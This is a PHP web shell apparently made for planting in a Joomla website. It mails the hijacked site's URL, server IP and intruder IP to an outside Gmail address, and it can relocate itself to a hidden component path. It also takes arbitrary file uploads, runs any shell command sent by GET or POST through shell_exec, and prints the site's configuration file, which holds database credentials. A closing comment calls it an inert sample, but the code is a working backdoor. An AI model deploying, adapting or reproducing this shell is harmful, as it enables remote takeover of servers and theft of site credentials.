error_reporting(0);
if (!isset($_SESSION['bajak']))	{
$visitcount = 0;
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$body = "ada yang inject \n$web$inj";
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE = OFF";}
else {$security= "SAFE_MODE = ON";};
$serper=gethostbyname($_SERVER['SERVER_ADDR']);
$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);
mail("pengensugehcok@gmail.com", "$body","Hasil Bajakan http://$web$inj\n$security\nIP Server = $serper\n IP Injector= $injektor");
$_SESSION['bajak'] = 0;
}
else {$_SESSION['bajak']++;};
if(isset($_GET['clone'])){
$source = $_SERVER['SCRIPT_FILENAME'];
$desti =$_SERVER['DOCUMENT_ROOT']."/components/com_content/views/archive/jembot.php";
rename($source, $desti);
}
$safem0de = @ini_get('safe_mode');
if (!$safem0de) {$security= "SAFE_MODE : OFF";}
else {$security= "SAFE_MODE : ON";}
echo "<title>Nobody</title><br>";
echo "<font size=2 color=#888888><b>".$security."</b><br>";
$cur_user="(".get_current_user().")";
echo "<font size=2 color=#888888><b>User : uid=".getmyuid().$cur_user." gid=".getmygid().$cur_user."</b><br>";
echo "<font size=2 color=#888888><b>Uname : ".php_uname()."</b><br>";
function pwd() {
$cwd = getcwd();
if($u=strrpos($cwd,'/')){
if($u!=strlen($cwd)-1){
return $cwd.'/';}
else{return $cwd;};
}
elseif($u=strrpos($cwd,'\\')){
if($u!=strlen($cwd)-1){
return $cwd.'\\';}
else{return $cwd;};
};
}
echo '<form method="POST" action=""><font size=2 color=#888888><b>Command</b><br><input type="text" name="cmd"><input type="Submit" name="command" value="cok"></form>';
echo '<form enctype="multipart/form-data" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input type=hidden name="submit"><input type=file name="userfile" size=28><br><font size=2 color=#888888><b>New name: </b></font><input type=text size=15 name="newname" class=ta><input type=submit class="bt" value="Upload"></form>';
if(isset($_POST['submit'])){
$uploaddir = pwd();
if(!$name=$_POST['newname']){$name = $_FILES['userfile']['name'];};
move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name);
if(move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir.$name)){
echo "Upload Failed";
} else { echo "Upload Success to ".$uploaddir.$name." :P "; }
}
if(isset($_POST['command'])){
$cmd = $_POST['cmd'];
echo "<pre><font size=3 color=#000000>".shell_exec($cmd)."</font></pre>";
}
elseif(isset($_GET['cmd'])){
$comd = $_GET['cmd'];
echo "<pre><font size=3 color=#000000>".shell_exec($comd)."</font></pre>";
}
elseif(isset($_GET['rf'])){
$rf = file_get_contents("../../configuration.php");
echo $rf;
}
// no default action in inert sample